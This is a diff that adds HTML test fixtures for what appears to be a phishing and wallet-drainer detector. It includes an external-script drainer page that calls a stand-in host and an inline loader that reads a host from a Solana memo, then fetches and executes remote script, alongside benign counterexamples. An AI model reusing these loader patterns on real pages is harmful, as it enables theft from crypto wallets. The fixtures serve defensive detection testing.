@@ -394,3 +394,116 @@ MICROSOFT_PHISHING = """<!DOCTYPE html>
   </script>
 </body>
 </html>"""
+
+
+# External-script wallet drainer: a near-empty "Loading…" shell whose real
+# payload is an executable <script src> on a throwaway clearnet domain, with a
+# chain= param and public Solana RPC endpoints. No password field — models the
+# real sE3wjlqvm3... sample. Should trigger external-script-drainer (MALICIOUS).
+EXTERNAL_SCRIPT_DRAINER = """<!DOCTYPE html>
+<html>
+<head><title>Loading…</title></head>
+<body>
+  <div id="app"></div>
+  <script defer src="https://slidecostrateyear.example/tracker.js?chain=evm&c=abc&a=yt"></script>
+  <script>
+    const RPCS = [
+      "https://api.mainnet.solana.com",
+      "https://rpc.ankr.com/solana",
+      "https://solana.drpc.org",
+      "https://solana-rpc.publicnode.com"
+    ];
+  </script>
+</body>
+</html>"""
+
+# Legit permaweb dApp loading its wallet lib from an allowlisted CDN (jsdelivr)
+# and calling window.solana. Must NOT trigger external-script-drainer.
+LEGIT_CDN_WALLET_DAPP = """<!DOCTYPE html>
+<html>
+<head><title>My Permaweb App</title></head>
+<body>
+  <h1>Welcome</h1>
+  <p>Connect your wallet to interact with this fully on-chain application.</p>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
+  <script>document.querySelector("#btn").onclick = () => window.solana.connect();</script>
+</body>
+</html>"""
+
+# Article discussing wallets that loads external analytics from a non-CDN host.
+# Brand mentions are prose, no active wallet interaction — must NOT trigger.
+WALLET_ARTICLE_EXTERNAL_ANALYTICS = """<!DOCTYPE html>
+<html>
+<head><title>Comparing Crypto Wallets</title></head>
+<body>
+  <script src="https://tiny-analytics.example/track.js"></script>
+  <article>
+    <h1>MetaMask vs Phantom</h1>
+    <p>MetaMask and Phantom are two of the most popular wallets. In this
+    article we compare the phantom wallet and metamask browser extensions.</p>
+  </article>
+</body>
+</html>"""
+
+
+# Inline / dead-drop wallet-drainer loader (the sibling variant of
+# EXTERNAL_SCRIPT_DRAINER). Cloak "Loading…" shell whose inline bootstrap reads
+# a payload host from an on-chain memo via public Solana RPCs, fetches the real
+# drainer, and injects+executes it. Models the real HAIfhhp1... sample. Should
+# trigger drainer-loader (MALICIOUS).
+INLINE_DRAINER_LOADER = """<!DOCTYPE html>
+<html>
+<head><title>Loading…</title></head>
+<body style="margin:0">
+  <div id="__root"></div>
+  <script>
+    const WALLET = '2Lvd4NwKjESPwkNFkZN43eJ3o86gdDUrPtGnakKKM4sU';
+    const RPCS = ['https://solana-rpc.publicnode.com','https://rpc.ankr.com/solana'];
+    async function rpc(method, params) {
+      const res = await fetch(RPCS[0], {method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({jsonrpc:'2.0', id:1, method, params})});
+      return (await res.json()).result;
+    }
+    (async () => {
+      const sigs = await rpc('getSignaturesForAddress', [WALLET, {limit:25}]);
+      const tx = await rpc('getTransaction', [sigs[0].signature, {}]);
+      const host = new TextDecoder().decode(Uint8Array.from(atob('aHR0cA=='), c => c.charCodeAt(0)));
+      const r = await fetch(host + '/content?id=abc');
+      const data = await r.json();
+      document.body.innerHTML = data.html;
+      const s = document.createElement('script');
+      s.textContent = data.js;
+      document.body.appendChild(s);
+    })();
+  </script>
+</body>
+</html>"""
+
+# Legit permaweb SPA shell: same "Loading…" cloak look and empty #root mount,
+# but it loads its own bundle via <script src> and does no fetch-inject-execute
+# and has no blockchain context. Must NOT trigger drainer-loader.
+LEGIT_SPA_SHELL = """<!DOCTYPE html>
+<html>
+<head><title>Loading…</title></head>
+<body>
+  <div id="root"></div>
+  <script src="/app.bundle.js"></script>
+</body>
+</html>"""
+
+# Legit SPA that fetches a JSON config and renders it via innerHTML — has
+# fetch + innerHTML but NO script-execution sink and NO blockchain context.
+# Must NOT trigger drainer-loader (precision).
+LEGIT_SPA_FETCH_CONFIG = """<!DOCTYPE html>
+<html>
+<head><title>Loading…</title></head>
+<body>
+  <div id="app"></div>
+  <script>
+    fetch('/config.json').then(r => r.json()).then(cfg => {
+      document.getElementById('app').innerHTML = '<h1>' + cfg.title + '</h1>';
+    });
+  </script>
+</body>
+</html>"""
